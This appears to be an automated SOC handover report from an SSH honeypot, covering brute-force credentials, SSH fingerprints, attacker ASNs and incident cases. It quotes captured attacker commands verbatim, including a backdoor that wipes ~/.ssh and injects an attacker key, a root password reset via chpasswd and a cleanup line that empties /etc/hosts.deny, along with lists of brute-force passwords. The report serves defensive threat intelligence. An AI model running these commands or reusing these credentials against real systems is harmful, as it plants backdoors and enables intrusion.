# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-07 |
| **Generated At** | 2026-04-07T05:47:00Z |
| **Shift Time** | 05:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **240** |
| Confirmed Threats | **230** |
| False Positives Filtered | **10** (4.2%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **10** |
| High Severity Cases | **79** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **161** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **160** |
| Unique Credential Pairs | **61** |
| Unique Usernames | **26** |
| Unique Passwords | **60** |
| Successful Auth Pairs | **45** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 79 |
| `345gs5662d34` | 37 |
| `ftpuser` | 5 |
| `frappe` | 4 |
| `test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 39 |
| `345gs5662d34` | 37 |
| `server29` | 2 |
| `steam1@2025` | 2 |
| `@Tx123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 39 |
| `345gs5662d34` | `345gs5662d34` | 37 |
| `server` | `server29` | 2 |
| `steam1` | `steam1@2025` | 2 |
| `root` | `@Tx123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Wang@123` | `27.128.171.39` | 2026-04-07T03:01:49 |
| `root` | `3245gs5662d34` | `27.128.171.39` | 2026-04-07T03:01:57 |
| `root` | `Abcd1234$` | `27.128.171.39` | 2026-04-07T03:03:27 |
| `root` | `Ty112233` | `27.128.171.39` | 2026-04-07T03:03:42 |
| `root` | `toor1234` | `103.119.94.10` | 2026-04-07T05:02:02 |
| `root` | `3245gs5662d34` | `103.119.94.10` | 2026-04-07T05:02:06 |
| `root` | `@Tx123456` | `158.69.194.34` | 2026-04-07T05:02:23 |
| `root` | `3245gs5662d34` | `158.69.194.34` | 2026-04-07T05:02:29 |
| `root` | `login123` | `117.6.44.221` | 2026-04-07T05:06:47 |
| `root` | `3245gs5662d34` | `117.6.44.221` | 2026-04-07T05:06:50 |
| `root` | `root1234567!@` | `158.69.194.34` | 2026-04-07T05:08:27 |
| `root` | `Asdf!@` | `158.69.194.34` | 2026-04-07T05:09:59 |
| `root` | `!@#$QWER1234qwer` | `117.6.44.221` | 2026-04-07T05:10:24 |
| `root` | `Papa@1234` | `82.152.132.24` | 2026-04-07T05:10:33 |
| `root` | `3245gs5662d34` | `82.152.132.24` | 2026-04-07T05:10:37 |
| `root` | `5tgbNHY^` | `158.69.194.34` | 2026-04-07T05:11:27 |
| `root` | `123456789@` | `117.6.44.221` | 2026-04-07T05:12:07 |
| `root` | `Qazwsx12345!` | `82.152.132.24` | 2026-04-07T05:13:32 |
| `root` | `123456qwe@` | `117.6.44.221` | 2026-04-07T05:13:48 |
| `root` | `Cheese123` | `158.69.194.34` | 2026-04-07T05:16:02 |
| `root` | `qazwsx2025#$` | `82.152.132.24` | 2026-04-07T05:16:34 |
| `root` | `QwerQwer1` | `158.69.194.34` | 2026-04-07T05:17:34 |
| `root` | `5tgbNHY^` | `117.6.44.221` | 2026-04-07T05:19:18 |
| `root` | `Aa11111111` | `117.6.44.221` | 2026-04-07T05:21:07 |
| `root` | `Aa11111111` | `158.69.194.34` | 2026-04-07T05:22:08 |
| `root` | `root1234567!@` | `117.6.44.221` | 2026-04-07T05:22:55 |
| `root` | `Cheese123` | `117.6.44.221` | 2026-04-07T05:24:39 |
| `root` | `Qazwsx0000!@` | `82.152.132.24` | 2026-04-07T05:25:50 |
| `root` | `123456qwe@` | `158.69.194.34` | 2026-04-07T05:26:35 |
| `root` | `root123456789..` | `82.152.132.24` | 2026-04-07T05:27:22 |
| `root` | `123456789@` | `158.69.194.34` | 2026-04-07T05:28:06 |
| `root` | `@Tx123456` | `117.6.44.221` | 2026-04-07T05:28:11 |
| `root` | `qwertyuiop.` | `82.152.132.24` | 2026-04-07T05:28:55 |
| `root` | `login123` | `158.69.194.34` | 2026-04-07T05:29:40 |
| `root` | `ccXX000` | `82.152.132.24` | 2026-04-07T05:30:25 |
| `root` | `Qwerty.` | `158.69.194.34` | 2026-04-07T05:31:10 |
| `root` | `Qwerty.` | `117.6.44.221` | 2026-04-07T05:31:42 |
| `root` | `Root20!` | `82.152.132.24` | 2026-04-07T05:31:52 |
| `root` | `PASSWORD` | `158.69.194.34` | 2026-04-07T05:34:18 |
| `root` | `1233211234` | `82.152.132.24` | 2026-04-07T05:34:58 |
| `root` | `!@#$QWER1234qwer` | `158.69.194.34` | 2026-04-07T05:35:53 |
| `root` | `Qazwsx888..` | `82.152.132.24` | 2026-04-07T05:38:08 |
| `root` | `QwerQwer1` | `117.6.44.221` | 2026-04-07T05:38:51 |
| `root` | `Asdf!@` | `117.6.44.221` | 2026-04-07T05:40:37 |
| `root` | `PASSWORD` | `117.6.44.221` | 2026-04-07T05:42:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **240** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 189 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 182 | 6 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `e37f354a101a...` | Mirai/variant | 2 | 1 |
| `19532158b559...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 182 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `e37f354a101a...` | libssh | 2 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 39 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:QvbGclSJPxKW"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `27.128.171.39`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `158.69.194.34`, `103.119.94.10`, `117.6.44.221`, `82.152.132.24`, `27.128.171.39`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **15** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS6821` | Makedonski Telekom AD-Skopje | 1 | LOW |
| `AS58519` | Cloud Computing Corporation | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS137987` | Md. Shohidul Islam T/A SK Link | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (79)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e755f49c32f6

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-04-07 03:01 |
| **Last Seen** | 2026-04-07 03:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 03:01:48` | `cowrie.session.connect` |
| `2026-04-07 03:01:48` | `cowrie.client.version` |
| `2026-04-07 03:01:48` | `cowrie.client.kex` |
| `2026-04-07 03:01:49` | `cowrie.login.success` |
| `2026-04-07 03:01:49` | `cowrie.session.params` |
| `2026-04-07 03:01:49` | `cowrie.command.input` |
| `2026-04-07 03:01:49` | `cowrie.command.failed` |
| `2026-04-07 03:01:49` | `cowrie.log.closed` |
| `2026-04-07 03:01:50` | `cowrie.session.params` |
| `2026-04-07 03:01:50` | `cowrie.command.input` |
| `2026-04-07 03:01:50` | `cowrie.session.file_download` |
| `2026-04-07 03:01:50` | `cowrie.log.closed` |
| `2026-04-07 03:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d81e143c4a5

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-04-07 03:01 |
| **Last Seen** | 2026-04-07 03:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 03:01:56` | `cowrie.session.connect` |
| `2026-04-07 03:01:56` | `cowrie.client.version` |
| `2026-04-07 03:01:56` | `cowrie.client.kex` |
| `2026-04-07 03:01:57` | `cowrie.login.success` |
| `2026-04-07 03:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b9fd6b0eb0

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-04-07 03:03 |
| **Last Seen** | 2026-04-07 03:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 03:03:26` | `cowrie.session.connect` |
| `2026-04-07 03:03:26` | `cowrie.client.version` |
| `2026-04-07 03:03:26` | `cowrie.client.kex` |
| `2026-04-07 03:03:27` | `cowrie.login.success` |
| `2026-04-07 03:03:27` | `cowrie.session.params` |
| `2026-04-07 03:03:27` | `cowrie.command.input` |
| `2026-04-07 03:03:27` | `cowrie.command.failed` |
| `2026-04-07 03:03:27` | `cowrie.log.closed` |
| `2026-04-07 03:03:27` | `cowrie.session.params` |
| `2026-04-07 03:03:27` | `cowrie.command.input` |
| `2026-04-07 03:03:28` | `cowrie.session.file_download` |
| `2026-04-07 03:03:28` | `cowrie.log.closed` |
| `2026-04-07 03:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c468a0513ce

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-04-07 03:03 |
| **Last Seen** | 2026-04-07 03:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 03:03:34` | `cowrie.session.connect` |
| `2026-04-07 03:03:34` | `cowrie.client.version` |
| `2026-04-07 03:03:34` | `cowrie.client.kex` |
| `2026-04-07 03:03:34` | `cowrie.login.success` |
| `2026-04-07 03:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea60269533a3

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-04-07 03:03 |
| **Last Seen** | 2026-04-07 03:04 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:QvbGclSJPxKW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 03:03:41` | `cowrie.session.connect` |
| `2026-04-07 03:03:41` | `cowrie.client.version` |
| `2026-04-07 03:03:42` | `cowrie.client.kex` |
| `2026-04-07 03:03:42` | `cowrie.login.success` |
| `2026-04-07 03:03:42` | `cowrie.session.params` |
| `2026-04-07 03:03:42` | `cowrie.command.input` |
| `2026-04-07 03:03:43` | `cowrie.command.failed` |
| `2026-04-07 03:03:43` | `cowrie.log.closed` |
| `2026-04-07 03:03:43` | `cowrie.session.params` |
| `2026-04-07 03:03:43` | `cowrie.command.input` |
| `2026-04-07 03:03:43` | `cowrie.session.file_download` |
| `2026-04-07 03:03:43` | `cowrie.log.closed` |
| `2026-04-07 03:03:55` | `cowrie.session.params` |
| `2026-04-07 03:03:55` | `cowrie.command.input` |
| `2026-04-07 03:03:56` | `cowrie.log.closed` |
| `2026-04-07 03:03:56` | `cowrie.session.params` |
| `2026-04-07 03:03:56` | `cowrie.command.input` |
| `2026-04-07 03:03:56` | `cowrie.log.closed` |
| `2026-04-07 03:03:56` | `cowrie.session.params` |
| `2026-04-07 03:03:56` | `cowrie.command.input` |
| `2026-04-07 03:03:57` | `cowrie.session.file_download` |
| `2026-04-07 03:03:57` | `cowrie.log.closed` |
| `2026-04-07 03:03:57` | `cowrie.session.params` |
| `2026-04-07 03:03:57` | `cowrie.command.input` |
| `2026-04-07 03:03:57` | `cowrie.log.closed` |
| `2026-04-07 03:03:57` | `cowrie.session.params` |
| `2026-04-07 03:03:57` | `cowrie.command.input` |
| `2026-04-07 03:03:58` | `cowrie.log.closed` |
| `2026-04-07 03:03:58` | `cowrie.session.params` |
| `2026-04-07 03:03:58` | `cowrie.command.input` |
| `2026-04-07 03:03:58` | `cowrie.command.input` |
| `2026-04-07 03:03:58` | `cowrie.log.closed` |
| `2026-04-07 03:03:58` | `cowrie.session.params` |
| `2026-04-07 03:03:58` | `cowrie.command.input` |
| `2026-04-07 03:03:59` | `cowrie.log.closed` |
| `2026-04-07 03:03:59` | `cowrie.session.params` |
| `2026-04-07 03:03:59` | `cowrie.command.input` |
| `2026-04-07 03:03:59` | `cowrie.log.closed` |
| `2026-04-07 03:03:59` | `cowrie.session.params` |
| `2026-04-07 03:03:59` | `cowrie.command.input` |
| `2026-04-07 03:04:00` | `cowrie.log.closed` |
| `2026-04-07 03:04:00` | `cowrie.session.params` |
| `2026-04-07 03:04:00` | `cowrie.command.input` |
| `2026-04-07 03:04:00` | `cowrie.log.closed` |
| `2026-04-07 03:04:00` | `cowrie.session.params` |
| `2026-04-07 03:04:00` | `cowrie.command.input` |
| `2026-04-07 03:04:01` | `cowrie.log.closed` |
| `2026-04-07 03:04:01` | `cowrie.session.params` |
| `2026-04-07 03:04:01` | `cowrie.command.input` |
| `2026-04-07 03:04:01` | `cowrie.log.closed` |
| `2026-04-07 03:04:01` | `cowrie.session.params` |
| `2026-04-07 03:04:01` | `cowrie.command.input` |
| `2026-04-07 03:04:02` | `cowrie.log.closed` |
| `2026-04-07 03:04:02` | `cowrie.session.params` |
| `2026-04-07 03:04:02` | `cowrie.command.input` |
| `2026-04-07 03:04:02` | `cowrie.log.closed` |
| `2026-04-07 03:04:02` | `cowrie.session.params` |
| `2026-04-07 03:04:02` | `cowrie.command.input` |
| `2026-04-07 03:04:03` | `cowrie.log.closed` |
| `2026-04-07 03:04:03` | `cowrie.session.params` |
| `2026-04-07 03:04:03` | `cowrie.command.input` |
| `2026-04-07 03:04:03` | `cowrie.log.closed` |
| `2026-04-07 03:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0567b2d052a

| Field | Detail |
|---|---|
| **Source IP** | `103.119.94[.]10` |
| **First Seen** | 2026-04-07 05:02 |
| **Last Seen** | 2026-04-07 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:02:01` | `cowrie.session.connect` |
| `2026-04-07 05:02:01` | `cowrie.client.version` |
| `2026-04-07 05:02:01` | `cowrie.client.kex` |
| `2026-04-07 05:02:02` | `cowrie.login.success` |
| `2026-04-07 05:02:02` | `cowrie.session.params` |
| `2026-04-07 05:02:02` | `cowrie.command.input` |
| `2026-04-07 05:02:02` | `cowrie.command.failed` |
| `2026-04-07 05:02:02` | `cowrie.log.closed` |
| `2026-04-07 05:02:03` | `cowrie.session.params` |
| `2026-04-07 05:02:03` | `cowrie.command.input` |
| `2026-04-07 05:02:03` | `cowrie.session.file_download` |
| `2026-04-07 05:02:03` | `cowrie.log.closed` |
| `2026-04-07 05:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.119.94[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.119.94[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e48d0225016

| Field | Detail |
|---|---|
| **Source IP** | `103.119.94[.]10` |
| **First Seen** | 2026-04-07 05:02 |
| **Last Seen** | 2026-04-07 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:02:05` | `cowrie.session.connect` |
| `2026-04-07 05:02:05` | `cowrie.client.version` |
| `2026-04-07 05:02:05` | `cowrie.client.kex` |
| `2026-04-07 05:02:06` | `cowrie.login.success` |
| `2026-04-07 05:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.119.94[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.119.94[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a79c1a31287

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:02 |
| **Last Seen** | 2026-04-07 05:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:02:22` | `cowrie.session.connect` |
| `2026-04-07 05:02:22` | `cowrie.client.version` |
| `2026-04-07 05:02:22` | `cowrie.client.kex` |
| `2026-04-07 05:02:23` | `cowrie.login.success` |
| `2026-04-07 05:02:24` | `cowrie.session.params` |
| `2026-04-07 05:02:24` | `cowrie.command.input` |
| `2026-04-07 05:02:24` | `cowrie.command.failed` |
| `2026-04-07 05:02:24` | `cowrie.log.closed` |
| `2026-04-07 05:02:25` | `cowrie.session.params` |
| `2026-04-07 05:02:25` | `cowrie.command.input` |
| `2026-04-07 05:02:25` | `cowrie.session.file_download` |
| `2026-04-07 05:02:25` | `cowrie.log.closed` |
| `2026-04-07 05:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496772e1b85d

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:02 |
| **Last Seen** | 2026-04-07 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

